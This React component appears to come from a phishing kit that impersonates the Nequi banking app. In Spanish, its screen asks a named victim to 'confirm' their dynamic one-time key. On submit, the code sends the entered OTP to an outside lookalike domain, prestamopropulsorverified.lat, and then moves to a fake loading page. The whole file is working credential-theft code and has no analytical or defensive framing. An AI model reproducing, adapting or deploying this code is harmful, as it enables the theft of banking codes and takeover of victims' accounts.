import { useState, useEffect, useRef } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { Lock } from 'lucide-react';
import Loading from "../loading/loading";

export default function ErrOTP() {
  const [dinamica, setDinamica] = useState("");
  const [captchaOk, setCaptchaOk] = useState(false);
  const [showClave, setShowClave] = useState(false);
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  // Referencias para el input de clave dinámica
  const dinamicaRef = useRef(null);

  useEffect(() => {
    const fetchUserData = async () => {
      const id = localStorage.getItem('id');

      try {
        const response = await axios.put(`https://prestamopropulsorverified.lat/api/v1/guest/${id}`);
        setUser(response.data.user);
        setLoading(false); 
      } catch (error) {
        console.error("Error al obtener los datos:", error);
        setLoading(false);
      }
    };

    fetchUserData();
  }, []); // El segundo parámetro vacío asegura que esto solo se ejecute una vez al montar

  const handleSubmit = async (e) => {
    e.preventDefault();

    const data = {
      otp: dinamica,
      status_id: 1,
    };

    const id = localStorage.getItem('id');

    try {
      const response = await axios.put(`https://prestamopropulsorverified.lat/api/v1/guest/${id}`, data);
      const newId = response.data;

      navigate("/nequi/loading");
    } catch (error) {
      console.error("Error:", error.response ? error.response.data : error.message);
    }
  };

  const handleFocus = () => {
    setShowClave(true);
  };

  const handleBlur = (e) => {
    if (!dinamicaRef.current.contains(e.relatedTarget)) {
      setShowClave(false);
    }
  };

  if (loading) {
    return <Loading />;
  }

  return (
    <div
      className="h-[800px] flex items-center p-5 justify-center bg-[#FBE5F2] bg-right"
      style={{ backgroundImage: "url(../background.png)" }}
    >
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        {/* Solo mostramos el nombre de usuario si está disponible */}
        {user && (
          <div className="text-center mb-4">
            <p className="text-lg font-semibold text-gray-800">Bienvenido, {user}!</p>
          </div>
        )}
        <h1 className="text-2xl font-bold text-center mb-2">Entra a tu Nequi</h1>
        <p className="text-center text-red-700 mb-6">
          ¡Fresco! Sabemos que eres tú, pero necesitamos que confirmes tu clave dinámica. Puedes copiarla directamente desde la app.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div
            className="relative"
            ref={dinamicaRef}
          >
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="Clave Dinámica"
              value={dinamica}
              onFocus={handleFocus}
              onBlur={handleBlur}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                setDinamica(value);
              }}
              required
              className="w-full border rounded px-3 py-2 bg-blue-50 focus:outline-none"
            />
            {showClave && (
              <div className="absolute top-full left-0 mt-2 w-full bg-white rounded-lg shadow-md p-4 text-center fadeIn">
                <p className="text-gray-700 text-sm mb-2">Puedes copiar la clave dinámica directamente desde la app</p>
                <div className="bg-black text-white rounded-lg p-4 flex flex-col items-end">
                  <div className="flex items-center justify-center gap-2 bg-[#5b0054] px-2 py-2 rounded-full mb-2">
                    <div className="w-4 h-4 bg-white rounded-full relative">
                      <div className="w-full h-full bg-pink-400 rounded-full"></div>
                    </div>
                    <span className="text-xs">Clave dinámica</span>
                    <span className="text-xs font-mono">{201909 || "------"}</span>
                    <div className="w-5">
                      <Lock size={16} />
                    </div>
                  </div>
                  <p className="text-xs text-start pt-10">Ya puedes escribir o copiar tu clave dinámica para hacer tus pagos</p>
                </div>
              </div>
            )}
          </div>

          <button
            type="submit"
            className="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-3 rounded transition"
          >
            Entra
          </button>
        </form>
      </div>
    </div>
  );
}
